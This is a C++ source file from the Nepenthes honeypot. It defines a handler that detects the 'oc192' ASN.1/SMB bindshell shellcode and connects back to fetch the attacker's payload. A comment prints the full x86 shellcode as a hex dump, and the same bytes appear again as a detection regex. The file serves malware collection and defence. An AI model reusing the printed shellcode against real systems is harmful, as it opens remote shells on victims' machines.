/********************************************************************************
 *                              Nepenthes
 *                        - finest collection -
 *
 *
 *
 * Copyright (C) 2005  Paul Baecher & Markus Koetter
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 * 
 * 
 *             contact nepenthesdev@users.sourceforge.net  
 *
 *******************************************************************************/

 /* $Id$ */

#include <netinet/in.h>
#include <arpa/inet.h>

#include "LogManager.hpp"
#include "Message.hpp"
#include "sch_asn1_smb_bind.hpp"
#include "Socket.hpp"
#include "Nepenthes.hpp"
#include "Utilities.hpp"
#include "DialogueFactoryManager.hpp"
#include "SocketManager.hpp"

#include "DownloadManager.hpp"

#ifdef STDTAGS 
#undef STDTAGS 
#endif
#define STDTAGS l_sc | l_hlr

using namespace nepenthes;

ASN1SMBBind::ASN1SMBBind(ShellcodeManager *shellcodemanager)
{
	m_ShellcodeManager = shellcodemanager;
	m_ShellcodeHandlerName = "ASN1SMBBind";
	m_ShellcodeHandlerDescription = "handles oc192 dcom bindshell";
	m_pcre = NULL;
}

ASN1SMBBind::~ASN1SMBBind()
{

}

bool ASN1SMBBind::Init()
{
	logPF();

/*
0x0110  65 65 65 65 65 65 65 65  65 65 65 65 eb 02 eb 6b  eeeeeeee eeee...k
0x0120  e8 f9 ff ff ff 53 55 56  57 8b 6c 24 18 8b 45 3c  .....SUV W.l$..E<
0x0130  8b 54 05 78 03 d5 8b 4a  18 8b 5a 20 03 dd e3 32  .T.x...J ..Z ...2
0x0140  49 8b 34 8b 03 f5 33 ff  fc 33 c0 ac 3a c4 74 07  I.4...3. .3..:.t.
0x0150  c1 cf 0d 03 f8 eb f2 3b  7c 24 14 75 e1 8b 5a 24  .......; |$.u..Z$
0x0160  03 dd 66 8b 0c 4b 8b 5a  1c 03 dd 8b 04 8b 03 c5  ..f..K.Z ........
0x0170  eb 02 33 c0 5f 5e 5d 5b  89 44 24 04 8b 04 24 89  ..3._^][ .D$...$.
0x0180  44 24 08 8b 44 24 04 83  c4 08 c3 5e 6a 30 59 64  D$..D$.. ...^j0Yd
0x0190  8b 19 8b 5b 0c 8b 5b 1c  8b 1b 8b 7b 08 83 ec 1c  ...[..[. ...{....
0x01a0  8b ec 33 c0 50 68 2e 65  78 65 89 65 14 57 68 ea  ..3.Ph.e xe.e.Wh.
0x01b0  49 8a e8 ff d6 6a 06 ff  75 14 ff d0 89 45 04 57  I....j.. u....E.W
0x01c0  68 db 8a 23 e9 ff d6 89  45 0c 57 68 8e 4e 0e ec  h..#.... E.Wh.N..
0x01d0  ff d6 33 c9 66 b9 6c 6c  51 68 33 32 2e 64 68 77  ..3.f.ll Qh32.dhw
0x01e0  73 32 5f 54 ff d0 8b d8  53 68 b6 19 18 e7 ff d6  s2_T.... Sh......
0x01f0  89 45 10 53 68 e7 79 c6  79 ff d6 89 45 18 53 68  .E.Sh.y. y...E.Sh
0x0200  6e 0b 2f 49 ff d6 6a 06  6a 01 6a 02 ff d0 89 45  n./I..j. j.j....E
0x0210  08 33 c0 50 50 50 b8 02  ff ab fc 80 f4 ff 50 8b  .3.PPP.. ......P.
0x0220  c4 6a 10 50 ff 75 08 53  68 a4 1a 70 c7 ff d6 ff  .j.P.u.S h..p....
0x0230  d0 58 53 68 a4 ad 2e e9  ff d6 6a 10 ff 75 08 ff  .XSh.... ..j..u..
0x0240  d0 33 c0 50 50 ff 75 08  53 68 e5 49 86 49 ff d6  .3.PP.u. Sh.I.I..
0x0250  ff d0 8b 4d 08 89 45 08  51 ff 55 18 81 c4 fc fe  ...M..E. Q.U.....
0x0260  ff ff 8b dc 33 c9 51 b1  ff 51 53 ff 75 08 ff 55  ....3.Q. .QS.u..U
0x0270  10 85 c0 7e 0a 50 53 ff  75 04 ff 55 0c eb e5 ff  ...~.PS. u..U....
0x0280  75 08 ff 55 18 57 68 5b  4c 1a dd ff d6 ff 75 04  u..U.Wh[ L.....u.
0x0290  ff d0 33 c0 50 ff 75 14  57 68 98 fe 8a 0e ff d6  ..3.P.u. Wh......
0x02a0  ff d0 57 68 ef ce e0 60  ff d6 ff d0 65 65 65 65  ..Wh...` ....
*/

	const char *oc192bindpcre = 
".*(\\xeb\\x02\\xeb\\x6b"
"\\xe8\\xf9\\xff\\xff\\xff\\x53\\x55\\x56\\x57\\x8b\\x6c\\x24\\x18\\x8b\\x45\\x3c"
"\\x8b\\x54\\x05\\x78\\x03\\xd5\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x03\\xdd\\xe3\\x32"
"\\x49\\x8b\\x34\\x8b\\x03\\xf5\\x33\\xff\\xfc\\x33\\xc0\\xac\\x3a\\xc4\\x74\\x07"
"\\xc1\\xcf\\x0d\\x03\\xf8\\xeb\\xf2\\x3b\\x7c\\x24\\x14\\x75\\xe1\\x8b\\x5a\\x24"
"\\x03\\xdd\\x66\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x03\\xdd\\x8b\\x04\\x8b\\x03\\xc5"
"\\xeb\\x02\\x33\\xc0\\x5f\\x5e\\x5d\\x5b\\x89\\x44\\x24\\x04\\x8b\\x04\\x24\\x89"
"\\x44\\x24\\x08\\x8b\\x44\\x24\\x04\\x83\\xc4\\x08\\xc3\\x5e\\x6a\\x30\\x59\\x64"
"\\x8b\\x19\\x8b\\x5b\\x0c\\x8b\\x5b\\x1c\\x8b\\x1b\\x8b\\x7b\\x08\\x83\\xec\\x1c"
"\\x8b\\xec\\x33\\xc0\\x50\\x68\\x2e\\x65\\x78\\x65\\x89\\x65\\x14\\x57\\x68\\xea"
"\\x49\\x8a\\xe8\\xff\\xd6\\x6a\\x06\\xff\\x75\\x14\\xff\\xd0\\x89\\x45\\x04\\x57"
"\\x68\\xdb\\x8a\\x23\\xe9\\xff\\xd6\\x89\\x45\\x0c\\x57\\x68\\x8e\\x4e\\x0e\\xec"
"\\xff\\xd6\\x33\\xc9\\x66\\xb9\\x6c\\x6c\\x51\\x68\\x33\\x32\\x2e\\x64\\x68\\x77"
"\\x73\\x32\\x5f\\x54\\xff\\xd0\\x8b\\xd8\\x53\\x68\\xb6\\x19\\x18\\xe7\\xff\\xd6"
"\\x89\\x45\\x10\\x53\\x68\\xe7\\x79\\xc6\\x79\\xff\\xd6\\x89\\x45\\x18\\x53\\x68"
"\\x6e\\x0b\\x2f\\x49\\xff\\xd6\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xff\\xd0\\x89\\x45"
"\\x08\\x33\\xc0\\x50\\x50\\x50\\xb8\\x02\\xff..\\x80\\xf4\\xff\\x50\\x8b"
"\\xc4\\x6a\\x10\\x50\\xff\\x75\\x08\\x53\\x68\\xa4\\x1a\\x70\\xc7\\xff\\xd6\\xff"
"\\xd0\\x58\\x53\\x68\\xa4\\xad\\x2e\\xe9\\xff\\xd6\\x6a\\x10\\xff\\x75\\x08\\xff"
"\\xd0\\x33\\xc0\\x50\\x50\\xff\\x75\\x08\\x53\\x68\\xe5\\x49\\x86\\x49\\xff\\xd6"
"\\xff\\xd0\\x8b\\x4d\\x08\\x89\\x45\\x08\\x51\\xff\\x55\\x18\\x81\\xc4\\xfc\\xfe"
"\\xff\\xff\\x8b\\xdc\\x33\\xc9\\x51\\xb1\\xff\\x51\\x53\\xff\\x75\\x08\\xff\\x55"
"\\x10\\x85\\xc0\\x7e\\x0a\\x50\\x53\\xff\\x75\\x04\\xff\\x55\\x0c\\xeb\\xe5\\xff"
"\\x75\\x08\\xff\\x55\\x18\\x57\\x68\\x5b\\x4c\\x1a\\xdd\\xff\\xd6\\xff\\x75\\x04"
"\\xff\\xd0\\x33\\xc0\\x50\\xff\\x75\\x14\\x57\\x68\\x98\\xfe\\x8a\\x0e\\xff\\xd6"
"\\xff\\xd0\\x57\\x68\\xef\\xce\\xe0\\x60\\xff\\xd6\\xff\\xd0).*";

	logInfo("pcre is %s \n",oc192bindpcre);
    
	const char * pcreEerror;
	int32_t pcreErrorPos;
	if((m_pcre = pcre_compile(oc192bindpcre, PCRE_DOTALL, &pcreEerror, &pcreErrorPos, 0)) == NULL)
	{
		logCrit("ASN1SMBBind could not compile pattern \n\t\"%s\"\n\t Error:\"%s\" at Position %u", 
				oc192bindpcre, pcreEerror, pcreErrorPos);
		return false;
	}
	return true;
}

bool ASN1SMBBind::Exit()
{
	if(m_pcre != NULL)
    	free(m_pcre);
	return true;

}

sch_result ASN1SMBBind::handleShellcode(Message **msg)
{
	logPF();
	logSpam("Shellcode is %i bytes long \n",(*msg)->getMsgLen());
	char *shellcode = (*msg)->getMsg();
	uint32_t len = (*msg)->getMsgLen();

	int32_t piOutput[10 * 3];
	int32_t iResult; 

//	(*msg)->getSocket()->getNepenthes()->getUtilities()->hexdump((unsigned char *)shellcode,len);




	if ((iResult = pcre_exec(m_pcre, 0, (char *) shellcode, len, 0, 0, piOutput, sizeof(piOutput)/sizeof(int32_t))) > 0)
	{
		logSpam("Found ASN1SMBBind .. %i\n",len);
//		g_Nepenthes->getUtilities()->hexdump((unsigned char *)shellcode,len);
		const char * pCode;

		pcre_get_substring((char *) shellcode, piOutput, iResult, 1, &pCode);

        uint16_t port = *(uint16_t *)&pCode[253];
		port = ntohs(port);
		logInfo("SMB ASN1 Bind Port %i  %i\n",port,(*msg)->getMsgLen());

		char *url;
		uint32_t host = (*msg)->getRemoteHost();
			
		asprintf(&url,"creceive://%s:%i",inet_ntoa(*(in_addr *)&host),port);
		g_Nepenthes->getDownloadMgr()->downloadUrl((char *)url,(*msg)->getRemoteHost(),"asn1 smb bind");
		logSpam("URL IS %s \n",url);
		free(url);
		return SCH_DONE;
		
	}
	return SCH_NOTHING;
}
